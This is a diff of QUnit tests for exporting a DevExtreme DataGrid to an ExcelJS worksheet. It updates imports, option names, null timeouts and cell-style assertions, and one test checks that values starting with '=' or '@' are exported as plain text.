@@ -1,23 +1,16 @@
 import $ from 'jquery';
-import browser from 'core/utils/browser';
-import localization from 'localization';
 import errors from 'core/errors';
-import ja from 'localization/messages/ja.json!';
-import messageLocalization from 'localization/message';
-import { extend } from 'core/utils/extend';
 import ExcelJS from 'exceljs';
 import { ExcelJSDataGridTestHelper } from './ExcelJSTestHelper.js';
 import { exportDataGrid } from 'excel_exporter';
 import { Export } from 'exporter/exceljs/export';
-import { initializeDxObjectAssign, clearDxObjectAssign } from './objectAssignHelper.js';
-import { initializeDxArrayFind, clearDxArrayFind } from './arrayFindHelper.js';
 import ExcelJSLocalizationFormatTests from './exceljs.format.tests.js';
-import { ExcelJSOptionTests } from './exceljs.option.tests.js';
+import { ExcelJSOptionTests } from './exceljs.options.tests.js';
+import { LoadPanelTests } from '../commonParts/loadPanel.tests.js';
 import { isDefined } from 'core/utils/type';
 
-import 'ui/data_grid/ui.data_grid';
+import 'ui/data_grid';
 
-import 'common.css!';
 import 'generic_light.css!';
 
 let helper;
@@ -44,14 +37,10 @@ QUnit.testStart(() => {
 });
 
 const moduleConfig = {
-    before: function() {
-        initializeDxObjectAssign();
-        initializeDxArrayFind();
-    },
     beforeEach: function() {
         this.worksheet = new ExcelJS.Workbook().addWorksheet('Test sheet');
         this.customizeCellCallCount = 0;
-        this.stub = sinon.stub(errors, 'log', () => {
+        this.stub = sinon.stub(errors, 'log').callsFake(() => {
             QUnit.assert.strictEqual(true, false, 'error.log should not be called');
         });
 
@@ -60,10 +49,6 @@ const moduleConfig = {
     afterEach: function() {
         this.stub.restore();
     },
-    after: function() {
-        clearDxObjectAssign();
-        clearDxArrayFind();
-    }
 };
 
 // How to view a generated ExcelJS workbook in Excel:
@@ -81,12 +66,13 @@ const moduleConfig = {
         const topLeft = { row: 2, column: 3 };
 
         const getOptions = (context, dataGrid, expectedCustomizeCellArgs, options) => {
-            const { keepColumnWidths = true, selectedRowsOnly = false, topLeftCell = topLeft } = options || {};
+            const { keepColumnWidths = true, selectedRowsOnly = false, topLeftCell = topLeft, loadPanel = { enabled: false } } = options || {};
 
             const result = {
                 component: dataGrid,
                 worksheet: context.worksheet,
                 topLeftCell: topLeftCell,
+                loadPanel: loadPanel,
                 customizeCell: (eventArgs) => {
                     if(isDefined(expectedCustomizeCellArgs)) {
                         helper.checkCustomizeCell(eventArgs, expectedCustomizeCellArgs, context.customizeCellCallCount++);
@@ -133,8 +119,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromGrid500Pixels, undefined], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -291,6 +276,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             dataGrid.beginUpdate();
+            dataGrid.option('width', 300);
             dataGrid.columnOption('f1', 'visible', true);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
@@ -368,7 +354,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then(() => {
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 done();
             });
         });
@@ -388,7 +374,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then(() => {
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 done();
             });
         });
@@ -411,8 +397,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 2 }, { row: 1, column: 2 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkValues(expectedCells, topLeft);
                 helper.checkCellRange(cellRange, { row: 1, column: 2 }, topLeft);
@@ -457,7 +442,7 @@ const moduleConfig = {
             }).dxDataGrid('instance');
 
             exportDataGrid(getOptions(this, dataGrid, null, true)).then(() => {
-                helper.checkColumnWidths([3.8, 67.6, undefined], topLeft.column, 0.2);
+                helper.checkColumnWidths([3.8, 67.6, undefined], topLeft.column);
                 done();
             });
         });
@@ -512,8 +497,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromGrid500Pixels, undefined], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: topLeft }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkValues(expectedCells, topLeft);
                 helper.checkCellRange(cellRange, { row: 1, column: 1 }, topLeft);
@@ -538,8 +522,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkColumnWidths([excelColumnWidthFromGrid500Pixels, undefined], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: topLeft }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkValues(expectedCells, topLeft);
                 helper.checkCellRange(cellRange, { row: 1, column: 1 }, topLeft);
@@ -758,7 +741,7 @@ const moduleConfig = {
                 columns: [{
                     dataField: 'f1'
                 }],
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -767,12 +750,10 @@ const moduleConfig = {
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
-
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -790,7 +771,7 @@ const moduleConfig = {
                     dataField: 'f1',
                     encodeHtml: false
                 }],
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -803,8 +784,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -818,15 +798,15 @@ const moduleConfig = {
             const ds = [{ f1: '@123', f2: '=123', f3: '-123', f4: '+123' }];
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
             const expectedCells = [[
-                { excelCell: { value: ds[0].f1, alignment: alignLeftTopNoWrap, numberFormat: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
-                { excelCell: { value: ds[0].f2, alignment: alignLeftTopNoWrap, numberFormat: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
-                { excelCell: { value: ds[0].f3, alignment: alignLeftTopNoWrap, numberFormat: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
-                { excelCell: { value: ds[0].f4, alignment: alignLeftTopNoWrap, numberFormat: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
+                { excelCell: { value: ds[0].f1, alignment: alignLeftTopNoWrap, numFmt: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } },
+                { excelCell: { value: ds[0].f2, alignment: alignLeftTopNoWrap, numFmt: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(1) } },
+                { excelCell: { value: ds[0].f3, alignment: alignLeftTopNoWrap, numFmt: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(2) } },
+                { excelCell: { value: ds[0].f4, alignment: alignLeftTopNoWrap, numFmt: '@' }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -834,8 +814,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 4 }, { row: 1, column: 4 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -855,7 +834,7 @@ const moduleConfig = {
                     pageIndex: 2
                 },
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -871,8 +850,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 1 }, { row: 3, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -886,7 +864,7 @@ const moduleConfig = {
             const ds = [{ f1: '1', f2: '2' }];
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -902,8 +880,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -918,7 +895,7 @@ const moduleConfig = {
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
                 rtlEnabled: true,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -934,8 +911,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row, rightToLeft: true });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -949,7 +925,7 @@ const moduleConfig = {
             const ds = [{ f1: '1', f2: '2' }];
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -986,13 +962,13 @@ const moduleConfig = {
             });
         });
 
-        QUnit.test('Data - 2 column & 2 rows, grid.rowTemplate: () => {}', function(assert) {
+        QUnit.test('Data - 2 column & 2 rows, grid.dataRowTemplate: () => {}', function(assert) {
             const done = assert.async();
             const ds = [{ f1: 'f1_1', f2: 'f1_2' }];
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                rowTemplate: (container) => { $(container).append('<tbody class=\'dx-row\'><tr><td>row</td><td>template</td></tr></tbody>'); },
-                loadingTimeout: undefined
+                dataRowTemplate: (container) => { $(container).append('<tr><td>row</td><td>template</td></tr>'); },
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1008,8 +984,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1031,7 +1006,7 @@ const moduleConfig = {
                     { type: 'buttons', width: 250, buttons: ['refresh'] }
                 ],
                 editing: { mode: 'row', allowUpdating: true, allowDeleting: true, allowAdding: true },
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1048,8 +1023,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1073,7 +1047,7 @@ const moduleConfig = {
                 selection: {
                     mode: 'multiple'
                 },
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1090,8 +1064,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels /* excelColumnWidthFromColumn150Pixels */ ], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1106,7 +1079,7 @@ const moduleConfig = {
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
                 columns: [{ dataField: 'f1', width: 250, visible: false }, { dataField: 'f2', width: 150 }],
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1126,8 +1099,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 // helper.checkColumnWidths([excelColumnWidthFromColumn250Pixels, excelColumnWidthFromColumn150Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1145,7 +1117,7 @@ const moduleConfig = {
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
                 columns: [{ dataField: 'f1', width: 250, visible: false }, { dataField: 'f2', width: 150 }],
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1164,8 +1136,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn250Pixels, excelColumnWidthFromColumn150Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1182,7 +1153,7 @@ const moduleConfig = {
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
                 columns: [{ dataField: 'f1', width: 250, visible: true }, { dataField: 'f2', width: 150 }],
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1200,8 +1171,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
                 // helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -1219,7 +1189,7 @@ const moduleConfig = {
 
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             exportDataGrid({
@@ -1248,7 +1218,7 @@ const moduleConfig = {
                 dataSource: ds,
                 wordWrapEnabled: true,
                 columns: [ 'f1', { dataField: 'f2', alignment: 'right' }],
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             exportDataGrid({
@@ -1271,7 +1241,7 @@ const moduleConfig = {
 
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 wordWrapEnabled: true
             }).dxDataGrid('instance');
 
@@ -1304,13 +1274,13 @@ const moduleConfig = {
                     { dataField: 'f1', dataType: 'string' }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
                 { excelCell: { value: 'F1', alignment: alignCenterTopNoWrap, type: ExcelJS.ValueType.String, dataType: 'string', font: { bold: true } }, gridCell: { rowType: 'header', column: dataGrid.columnOption(0) } }
             ], [
-                { excelCell: { value: '1', type: ExcelJS.ValueType.String, dataType: 'string', numberFormat: undefined, alignment: alignLeftTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } }
+                { excelCell: { value: '1', type: ExcelJS.ValueType.String, dataType: 'string', numFmt: undefined, alignment: alignLeftTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(0) } }
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -1318,8 +1288,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkCellFormat(expectedCells);
@@ -1341,7 +1310,7 @@ const moduleConfig = {
                 }],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1369,7 +1338,7 @@ const moduleConfig = {
                 }],
                 wordWrapEnabled: true,
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1381,8 +1350,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false })).then((cellRange) => {
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 done();
@@ -1395,7 +1363,7 @@ const moduleConfig = {
 
             const dataGrid = $('#dataGrid').dxDataGrid({
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[1]]
             }).dxDataGrid('instance');
@@ -1409,8 +1377,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false, selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1432,7 +1399,7 @@ const moduleConfig = {
                     { dataType: 'string', calculateCellValue: () => 'str1' },
                     { dataType: 'string', calculateCellValue: () => 'str2' }
                 ],
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -1449,8 +1416,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 4 }, { row: 1, column: 5 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1469,7 +1435,7 @@ const moduleConfig = {
                     { dataType: 'string', calculateCellValue: (rowData) => rowData.id }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[0]]
             }).dxDataGrid('instance');
@@ -1484,8 +1450,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 2 }, { row: 1, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1505,7 +1470,7 @@ const moduleConfig = {
                     { dataField: 'fieldNotExist', calculateCellValue: rowData => rowData.field1 + '_notExists' }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[0]]
             }).dxDataGrid('instance');
@@ -1521,8 +1486,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 3 }, { row: 1, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1541,7 +1505,7 @@ const moduleConfig = {
                 }],
                 wordWrapEnabled: false,
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1555,8 +1519,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 assert.equal(typeof this.worksheet.getCell(topLeft.row + 1, topLeft.column).value, 'number', `this.worksheet.getCell(${topLeft.row + 1}, ${topLeft.column}).value`);
@@ -1577,7 +1540,7 @@ const moduleConfig = {
                 }],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -1609,7 +1572,7 @@ const moduleConfig = {
                     { dataType: 'number', calculateCellValue: () => Number.NEGATIVE_INFINITY }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -1620,7 +1583,7 @@ const moduleConfig = {
                 { excelCell: { value: 1, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(3) } },
                 { excelCell: { value: -2, alignment: alignRightTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(4) } },
                 { excelCell: { value: 'Infinity', alignment: alignRightTopNoWrap }, gridCell: { value: Infinity, rowType: 'data', data: ds[0], column: dataGrid.columnOption(5) } },
-                { excelCell: { value: '-Infinity', alignment: alignRightTopNoWrap }, gridCell: { value: -Infinity, rowType: 'data', data: ds[0], column: dataGrid.columnOption(6) } },
+                { excelCell: { value: '-Infinity', alignment: alignRightTopNoWrap, numFmt: '@' }, gridCell: { value: -Infinity, rowType: 'data', data: ds[0], column: dataGrid.columnOption(6) } },
             ]];
 
             helper._extendExpectedCells(expectedCells, topLeft);
@@ -1628,8 +1591,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 6 }, { row: 1, column: 7 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1653,7 +1615,7 @@ const moduleConfig = {
                     { dataType: 'number', calculateCellValue: rowData => rowData.id }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[0]]
             }).dxDataGrid('instance');
@@ -1667,8 +1629,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 1, column: 1 }, { row: 1, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -1686,7 +1647,7 @@ const moduleConfig = {
                     dataType: 'boolean'
                 }],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
